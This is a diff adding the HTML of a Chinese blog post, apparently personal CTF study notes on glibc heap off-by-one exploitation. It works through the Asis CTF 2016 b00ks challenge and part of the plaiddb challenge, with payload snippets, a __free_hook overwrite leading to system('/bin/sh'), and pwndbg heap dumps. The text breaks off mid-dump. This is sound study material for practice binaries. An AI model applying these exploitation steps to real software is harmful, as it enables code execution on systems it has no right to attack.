@@ -1,0 +1,1593 @@
+<!DOCTYPE html>
+<html lang="en">
+<head hexo-theme='https://github.com/volantis-x/hexo-theme-volantis/tree/4.2.0'>
+  <meta charset="utf-8">
+  <!-- SEO相关 -->
+  
+    
+  
+  <!-- 渲染优化 -->
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  <link rel='dns-prefetch' href='https://cdn.jsdelivr.net'>
+  <link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin>
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <!-- 页面元数据 -->
+  
+  <title>堆利用(三)之offbyone - 虽然没什么用但还是想记下来</title>
+  
+
+  
+
+  <!-- feed -->
+  
+
+  <!-- import meta -->
+  
+
+  <!-- link -->
+  
+
+  <!-- import link -->
+  
+
+  
+    
+<link rel="stylesheet" href="/css/first.css">
+
+  
+
+  
+  <link rel="stylesheet" href="/css/style.css" media="print" onload="this.media='all';this.onload=null">
+  <noscript><link rel="stylesheet" href="/css/style.css"></noscript>
+  
+
+  <script id="loadcss"></script>
+
+</head>
+
+<body>
+  
+
+<header id="l_header" class="l_header auto shadow blur show" style='opacity: 0' >
+  <div class='container'>
+  <div id='wrapper'>
+    <div class='nav-sub'>
+      <p class="title"></p>
+      <ul class='switcher nav-list-h m-phone' id="pjax-header-nav-list">
+        <li><a id="s-comment" class="fas fa-comments fa-fw" target="_self" href='javascript:void(0)'></a></li>
+        
+          <li><a id="s-toc" class="s-toc fas fa-list fa-fw" target="_self" href='javascript:void(0)'></a></li>
+        
+      </ul>
+    </div>
+		<div class="nav-main">
+      
+        
+        <a class="title flat-box" target="_self" href='/'>
+          
+            <img no-lazy class='logo' src='https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/blog/Logo-NavBar@3x.png'/>
+          
+          
+          
+        </a>
+      
+
+			<div class='menu navigation'>
+				<ul class='nav-list-h m-pc'>
+          
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/
+                  
+                  
+                  
+                    id="home"
+                  >
+                  <i class='fas fa-rss fa-fw'></i>博客
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/categories/
+                  
+                  
+                  
+                    id="categories"
+                  >
+                  <i class='fas fa-folder-open fa-fw'></i>分类
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/tags/
+                  
+                  
+                  
+                    id="tags"
+                  >
+                  <i class='fas fa-tags fa-fw'></i>标签
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/archives/
+                  
+                  
+                  
+                    id="archives"
+                  >
+                  <i class='fas fa-archive fa-fw'></i>归档
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/friends/
+                  
+                  
+                  
+                    id="friends"
+                  >
+                  <i class='fas fa-link fa-fw'></i>友链
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/about/
+                  
+                  
+                  
+                    id="about"
+                  >
+                  <i class='fas fa-info-circle fa-fw'></i>关于
+                </a>
+                
+              </li>
+            
+          
+          
+				</ul>
+			</div>
+
+      <div class="m_search">
+        <form name="searchform" class="form u-search-form">
+          <i class="icon fas fa-search fa-fw"></i>
+          <input type="text" class="input u-search-input" placeholder="Search..." />
+        </form>
+      </div>
+
+			<ul class='switcher nav-list-h m-phone'>
+				
+					<li><a class="s-search fas fa-search fa-fw" target="_self" href='javascript:void(0)'></a></li>
+				
+				<li>
+          <a class="s-menu fas fa-bars fa-fw" target="_self" href='javascript:void(0)'></a>
+          <ul class="menu-phone list-v navigation white-box">
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/
+                  
+                  
+                  
+                    id="home"
+                  >
+                  <i class='fas fa-rss fa-fw'></i>博客
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/categories/
+                  
+                  
+                  
+                    id="categories"
+                  >
+                  <i class='fas fa-folder-open fa-fw'></i>分类
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/tags/
+                  
+                  
+                  
+                    id="tags"
+                  >
+                  <i class='fas fa-tags fa-fw'></i>标签
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/archives/
+                  
+                  
+                  
+                    id="archives"
+                  >
+                  <i class='fas fa-archive fa-fw'></i>归档
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/friends/
+                  
+                  
+                  
+                    id="friends"
+                  >
+                  <i class='fas fa-link fa-fw'></i>友链
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/about/
+                  
+                  
+                  
+                    id="about"
+                  >
+                  <i class='fas fa-info-circle fa-fw'></i>关于
+                </a>
+                
+              </li>
+            
+          
+            
+          </ul>
+        </li>
+			</ul>
+		</div>
+	</div>
+  </div>
+</header>
+
+  <div id="l_body">
+    <div id="l_cover">
+  
+    
+        <div id="full" class='cover-wrapper post dock' style="display: none;">
+          
+            <div class='cover-bg lazyload placeholder' data-bg="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/033.jpg"></div>
+          
+          <div class='cover-body'>
+  <div class='top'>
+    
+    
+      <p class="title">1ss4k</p>
+    
+    
+  </div>
+  <div class='bottom'>
+    <div class='menu navigation'>
+      <div class='list-h'>
+        
+          
+            <a href="/v4/getting-started/"
+              
+              
+              id="v4getting-started">
+              <img src='https://cdn.jsdelivr.net/gh/twitter/twemoji@13.0/assets/svg/1f5c3.svg'><p>文档</p>
+            </a>
+          
+            <a href="/faqs/"
+              
+              
+              id="faqs">
+              <img src='https://cdn.jsdelivr.net/gh/twitter/twemoji@13.0/assets/svg/1f516.svg'><p>帮助</p>
+            </a>
+          
+            <a href="/examples/"
+              
+              
+              id="examples">
+              <img src='https://cdn.jsdelivr.net/gh/twitter/twemoji@13.0/assets/svg/1f396.svg'><p>示例</p>
+            </a>
+          
+            <a href="/contributors/"
+              
+              
+              id="contributors">
+              <img src='https://cdn.jsdelivr.net/gh/twitter/twemoji@13.0/assets/svg/1f389.svg'><p>社区</p>
+            </a>
+          
+            <a href="/archives/"
+              
+              
+              id="archives">
+              <img src='https://cdn.jsdelivr.net/gh/twitter/twemoji@13.0/assets/svg/1f4f0.svg'><p>博客</p>
+            </a>
+          
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+          <div id="scroll-down" style="display: none;"><i class="fa fa-chevron-down scroll-down-effects"></i></div>
+        </div>
+    
+  
+  </div>
+
+    <div id='safearea'>
+      <div class='body-wrapper' id="pjax-container">
+        
+
+<div class='l_main'>
+  <article class="article post white-box reveal md shadow article-type-post" id="post" itemscope itemprop="blogPost">
+  
+
+
+  
+  <div class="article-meta" id="top">
+    
+    
+    
+      <h1 class="title">
+        堆利用(三)之offbyone
+      </h1>
+      <div class='new-meta-box'>
+        
+          
+            
+<div class='new-meta-item author'>
+  <a class='author' href="/" rel="nofollow">
+    <img no-lazy src="">
+    <p>请设置文章作者</p>
+  </a>
+</div>
+
+          
+        
+          
+            
+  <div class='new-meta-item category'>
+    <a class='notlink'>
+      <i class="fas fa-folder-open fa-fw" aria-hidden="true"></i>
+      <a class="category-link" href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/">二进制</a>
+    </a>
+  </div>
+
+
+          
+        
+          
+            <div class="new-meta-item date">
+  <a class='notlink'>
+    <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
+    <p>发布于：Apr 28, 2021</p>
+  </a>
+</div>
+
+          
+        
+          
+            
+  <div class="new-meta-item browse leancloud">
+    <a class='notlink'>
+      
+      <div id="lc-pv" data-title="堆利用(三)之offbyone" data-path="/2021/04/28/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B8%89%E4%B9%8Boffbyone/">
+        <i class="fas fa-eye fa-fw" aria-hidden="true"></i>
+        <span id='number'><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span>
+        次浏览
+      </div>
+    </a>
+  </div>
+
+
+          
+        
+      </div>
+    
+  </div>
+
+
+  
+  <p>本文主要记录阅读一些文章时的笔记及总结</p>
+<h2 id="一、Asis-CTF-2016-b00ks-wp-null-off-by-one-【详】"><a href="#一、Asis-CTF-2016-b00ks-wp-null-off-by-one-【详】" class="headerlink" title="一、Asis CTF 2016 b00ks wp (null off-by-one)【详】"></a>一、Asis CTF 2016 b00ks wp (null off-by-one)【详】</h2><p>文章地址 <a target="_blank" rel="noopener" href="https://www.jianshu.com/p/56acd25fd02a">https://www.jianshu.com/p/56acd25fd02a</a></p>
+<p>先看一道例题 b00ks。</p>
+<p>漏洞的位置是输入名字那里。调试的时候输入的name为’a’*30+’bc’。</p>
+<p>然后pwndbg中search abc。</p>
+<p><img src="/2021/04/28/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B8%89%E4%B9%8Boffbyone/1.jpg" class="lazyload" data-srcset="/2021/04/28/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B8%89%E4%B9%8Boffbyone/1.jpg" srcset="data:image/png;base64,666" alt="1"></p>
+<p>构造堆块1</p>
+<p><img src="/2021/04/28/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B8%89%E4%B9%8Boffbyone/2.png" class="lazyload" data-srcset="/2021/04/28/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B8%89%E4%B9%8Boffbyone/2.png" srcset="data:image/png;base64,666" alt="2"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">createbook(<span class="number">150</span>, <span class="string">&quot;kkbook1&quot;</span>, <span class="number">0x100</span>, <span class="string">&quot;haha&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>存放name和description的内存结构如下</p>
+<p><img src="/2021/04/28/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B8%89%E4%B9%8Boffbyone/3.png" class="lazyload" data-srcset="/2021/04/28/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B8%89%E4%B9%8Boffbyone/3.png" srcset="data:image/png;base64,666" alt="3"></p>
+<p>edit1号块的时候，是从discription开始写的。</p>
+<p>用print输出book1，就会得到book1的地址。</p>
+<p><code>book1_addr ==&gt; 0x5555557581d0</code></p>
+<p>在book1中构造一个fake_chunk。使fake_book1_name指向book2_des，fake_book1_des指向book2_des。book1_des的地址是 0x5555557580c0</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;a&quot;</span> * <span class="number">0x40</span> + p64(<span class="number">0x01</span>) + p64(book1_addr + <span class="number">0x40</span>) + p64(book1_addr + <span class="number">0x38</span>) + p64(<span class="number">0xffff</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/04/28/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B8%89%E4%B9%8Boffbyone/4.png" class="lazyload" data-srcset="/2021/04/28/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B8%89%E4%B9%8Boffbyone/4.png" srcset="data:image/png;base64,666" alt="4"></p>
+<p>接下来我们修改作者，溢出，使得book1变为我们构造的fake_book1。</p>
+<p><img src="/2021/04/28/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B8%89%E4%B9%8Boffbyone/5.png" class="lazyload" data-srcset="/2021/04/28/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B8%89%E4%B9%8Boffbyone/5.png" srcset="data:image/png;base64,666" alt="5"></p>
+<p><img src="/2021/04/28/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B8%89%E4%B9%8Boffbyone/6.png" class="lazyload" data-srcset="/2021/04/28/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B8%89%E4%B9%8Boffbyone/6.png" srcset="data:image/png;base64,666" alt="6"></p>
+<p>计算基址：</p>
+<p>mmap分配的地址如下</p>
+<p><img src="/2021/04/28/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B8%89%E4%B9%8Boffbyone/7.png" class="lazyload" data-srcset="/2021/04/28/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B8%89%E4%B9%8Boffbyone/7.png" srcset="data:image/png;base64,666" alt="7"></p>
+<p>libc的地址如下</p>
+<p><img src="/2021/04/28/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B8%89%E4%B9%8Boffbyone/8.png" class="lazyload" data-srcset="/2021/04/28/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B8%89%E4%B9%8Boffbyone/8.png" srcset="data:image/png;base64,666" alt="8"></p>
+<p><code>offset = book2_name_addr - 0x00007ffff7a0d000 = 0x4da010</code></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; distance <span class="number">0x7ffff7a0d000</span> <span class="number">0x00007ffff7ee7010</span></span><br><span class="line">0x7ffff7a0d000-&gt;0x7ffff7ee7010 is 0x4da010 bytes (0x9b402 words)</span><br></pre></td></tr></table></figure>
+
+<p>自己设置的加载基址是不变的，但是本题开启了PIE，每次基址都是不同的，所以需要算一下。</p>
+<p>接下来泄漏一些重要函数的地址</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">free_hook_addr = libc_base + libc.symbols[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh_addr = libc_base + libc.search(<span class="string">&quot;/bin/sh&quot;</span>).next()</span><br><span class="line"></span><br><span class="line">----</span><br><span class="line"></span><br><span class="line">book2_name_addr ==&gt; 0x7ffff7ee7010</span><br><span class="line">book2_des_addr ==&gt; 0x7ffff7918010</span><br><span class="line">libc_base ==&gt; 0x7ffff7a0d000</span><br><span class="line">free_hook_addr ==&gt; 0x7ffff7dd37a8</span><br><span class="line">system_addr ==&gt; 0x7ffff7a0d000</span><br><span class="line">binsh_addr ==&gt; 0x7ffff7b99e17</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>记录一下内存结构</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#起始</span></span><br><span class="line"><span class="number">0x55555575605d</span><span class="number">-0x35</span>+<span class="number">0x8</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#堆块1</span></span><br><span class="line">0x00005555557581d0---&gt;0x0000555555758100</span><br><span class="line"><span class="comment">#堆块1-description</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; telescope <span class="number">0x0000555555758100</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│   <span class="number">0x555555758100</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│   <span class="number">0x555555758108</span> —▸ <span class="number">0x555555758210</span> —▸ <span class="number">0x7ffff7918010</span> ◂— <span class="string">&#x27;hello world&#x27;</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│   <span class="number">0x555555758110</span> —▸ <span class="number">0x555555758208</span> —▸ <span class="number">0x7ffff7ee7010</span> ◂— <span class="number">0x326b6f6f626b6b</span> /* <span class="string">&#x27;kkbook2&#x27;</span> */</span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│   <span class="number">0x555555758118</span> ◂— <span class="number">0xffff</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│   <span class="number">0x555555758120</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="meta">... </span>↓</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/04/28/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B8%89%E4%B9%8Boffbyone/9.png" class="lazyload" data-srcset="/2021/04/28/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B8%89%E4%B9%8Boffbyone/9.png" srcset="data:image/png;base64,666" alt="9"></p>
+<p>此时edit 1号块，就会修改1的description部分，即跳转到堆块2的name部分。</p>
+<p><img src="/2021/04/28/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B8%89%E4%B9%8Boffbyone/10.png" class="lazyload" data-srcset="/2021/04/28/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B8%89%E4%B9%8Boffbyone/10.png" srcset="data:image/png;base64,666" alt="10"></p>
+<p>再edit 2号块，修改的是2号块的des </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">editbook(<span class="number">2</span>, p64(system_addr))</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/04/28/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B8%89%E4%B9%8Boffbyone/11.png" class="lazyload" data-srcset="/2021/04/28/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B8%89%E4%B9%8Boffbyone/11.png" srcset="data:image/png;base64,666" alt="11"></p>
+<p>ida中查看free函数</p>
+<p><img src="/2021/04/28/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B8%89%E4%B9%8Boffbyone/12.png" class="lazyload" data-srcset="/2021/04/28/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B8%89%E4%B9%8Boffbyone/12.png" srcset="data:image/png;base64,666" alt="12"></p>
+<p>free了3个指针，2号堆块的name处存放的是 /bin/sh，des处存放的是free_hook。<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_38204481/article/details/81320898">此篇文章</a> 中说了 __free_hook函数在内存中前面紧挨的是它的参数，所以要把2号块的name处放/bin/sh。free_hook前面就是/bin/sh。</p>
+<p>所以free(2)，就会执行system(/bin/sh)，即可getshell。</p>
+<p><img src="/2021/04/28/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B8%89%E4%B9%8Boffbyone/13.png" class="lazyload" data-srcset="/2021/04/28/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B8%89%E4%B9%8Boffbyone/13.png" srcset="data:image/png;base64,666" alt="13"></p>
+<p>参考的文章<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/56acd25fd02a">https://www.jianshu.com/p/56acd25fd02a</a> 中，</p>
+<p><img src="/2021/04/28/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B8%89%E4%B9%8Boffbyone/14.png" class="lazyload" data-srcset="/2021/04/28/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B8%89%E4%B9%8Boffbyone/14.png" srcset="data:image/png;base64,666" alt="14"></p>
+<p>如果这个计算是正确的话，也就是说，指针原本指向的就是name区域？</p>
+<p>还参考了如下文章</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41918771/article/details/101347234">初探off-by-one之Asis CTF 2016 b00ks</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_33528164/article/details/79778690?utm_medium=distribute.pc_relevant.none-task-blog-searchFromBaidu-5.control&depth_1-utm_source=distribute.pc_relevant.none-task-blog-searchFromBaidu-5.control">Asis CTF 2016 b00ks</a></p>
+<p><a target="_blank" rel="noopener" href="http://blog.eonew.cn/archives/521">__free_hook 劫持原理</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.dazhuanlan.com/2019/08/22/5d5def6881498/">off by one 利用原理</a></p>
+<h2 id="二、ctf-wiki"><a href="#二、ctf-wiki" class="headerlink" title="二、ctf-wiki"></a>二、ctf-wiki</h2><p>文章地址 <a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/glibc-heap/off_by_one/">https://ctf-wiki.org/pwn/linux/glibc-heap/off_by_one/</a></p>
+<p>1、示例一运行失败，最多只能覆盖16字节，当传入17个字节时，会报错。可能是加入了一些检查机制。</p>
+<p><img src="/2021/04/28/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B8%89%E4%B9%8Boffbyone/15.png" class="lazyload" data-srcset="/2021/04/28/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B8%89%E4%B9%8Boffbyone/15.png" srcset="data:image/png;base64,666" alt="15"></p>
+<p>2、题目2—plaidctf 2015 plaiddb</p>
+<p>题目下载地址 <a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/off_by_one/2015_plaidctf_datastore%EF%BC%8C%E7%9B%B4%E6%8E%A5%E6%8B%96%E5%88%B0%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%87%8C%E5%8D%B3%E5%8F%AF%E3%80%82">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/off_by_one/2015_plaidctf_datastore，直接拖到虚拟机里即可。</a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">预先参考博客：</span><br><span class="line">https://bbs.pediy.com/thread<span class="number">-246966.</span>htm</span><br></pre></td></tr></table></figure>
+
+
+
+<p>开启的保护如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br><span class="line">FORTIFY:  Enabled</span><br></pre></td></tr></table></figure>
+
+<p>运行程序，发现PUT是输入，GET和DUMP都可以输出内容，DUMP是输出所有内容，DEL是删除内容。</p>
+<p><img src="/2021/04/28/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B8%89%E4%B9%8Boffbyone/16.png" class="lazyload" data-srcset="/2021/04/28/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B8%89%E4%B9%8Boffbyone/16.png" srcset="data:image/png;base64,666" alt="16"></p>
+<p>ida中分析，发现GET和PUT最开始都会调用sub_1040进行单行读取。</p>
+<p><img src="/2021/04/28/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B8%89%E4%B9%8Boffbyone/17.png" class="lazyload" data-srcset="/2021/04/28/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B8%89%E4%B9%8Boffbyone/17.png" srcset="data:image/png;base64,666" alt="17"></p>
+<p>红框下面的v1=0，存在off by one漏洞。</p>
+<p>参考<a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-246966.htm%EF%BC%8C%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B%E5%A6%82%E4%B8%8B">https://bbs.pediy.com/thread-246966.htm，利用过程如下</a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">DEL(<span class="string">&quot;th3fl4g&quot;</span>)  <span class="comment">#delet th3fl4g</span></span><br><span class="line"></span><br><span class="line">PUT(<span class="string">&quot;A&quot;</span>*<span class="number">0x8</span>, <span class="number">0x80</span>, p8(<span class="number">1</span>)*<span class="number">0x80</span>)</span><br><span class="line">PUT(<span class="string">&quot;B&quot;</span>*<span class="number">0x8</span>, <span class="number">0x18</span>, p8(<span class="number">2</span>)*<span class="number">0x18</span>)</span><br><span class="line">PUT(<span class="string">&quot;C&quot;</span>*<span class="number">0x8</span>, <span class="number">0x60</span>, p8(<span class="number">3</span>)*<span class="number">0x60</span>)</span><br><span class="line">PUT(<span class="string">&quot;D&quot;</span>*<span class="number">0x8</span>, <span class="number">0xf0</span>, p8(<span class="number">4</span>)*<span class="number">0xf0</span>)</span><br></pre></td></tr></table></figure>
+
+<p>内存结构如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line"><span class="number">0x555555758000</span> FASTBIN &#123;</span><br><span class="line">  prev_size = <span class="number">0</span>, </span><br><span class="line">  size = <span class="number">65</span>, <span class="comment">#计算出下一个堆块的位置</span></span><br><span class="line">  fd = <span class="number">0x555555758090</span>, <span class="comment">#key A的地址</span></span><br><span class="line">  bk = <span class="number">0x80</span>, <span class="comment">#A的size</span></span><br><span class="line">  fd_nextsize = <span class="number">0x5555557580b0</span>, <span class="comment">#A data的地址</span></span><br><span class="line">  bk_nextsize = <span class="number">0x0</span></span><br><span class="line">&#125;<span class="comment">#这个是struct A节点</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x555555758040</span> FASTBIN &#123;</span><br><span class="line">  prev_size = <span class="number">1</span>, </span><br><span class="line">  size = <span class="number">33</span>, </span><br><span class="line">  fd = <span class="number">0x202020202020202</span>, </span><br><span class="line">  bk = <span class="number">0x202020202020202</span>, </span><br><span class="line">  fd_nextsize = <span class="number">0x202020202020202</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x21</span></span><br><span class="line">&#125;<span class="comment">#B节点的data</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x555555758060</span> FASTBIN &#123;</span><br><span class="line">  prev_size = <span class="number">144680345676153346</span>, </span><br><span class="line">  size = <span class="number">33</span>, </span><br><span class="line">  fd = <span class="number">0x4242424242424242</span>, </span><br><span class="line">  bk = <span class="number">0x0</span>, </span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x21</span></span><br><span class="line">&#125;<span class="comment">#B节点的key</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x555555758080</span> FASTBIN &#123;</span><br><span class="line">  prev_size = <span class="number">0</span>, </span><br><span class="line">  size = <span class="number">33</span>, </span><br><span class="line">  fd = <span class="number">0x4141414141414141</span>, </span><br><span class="line">  bk = <span class="number">0x0</span>, </span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x91</span></span><br><span class="line">&#125;<span 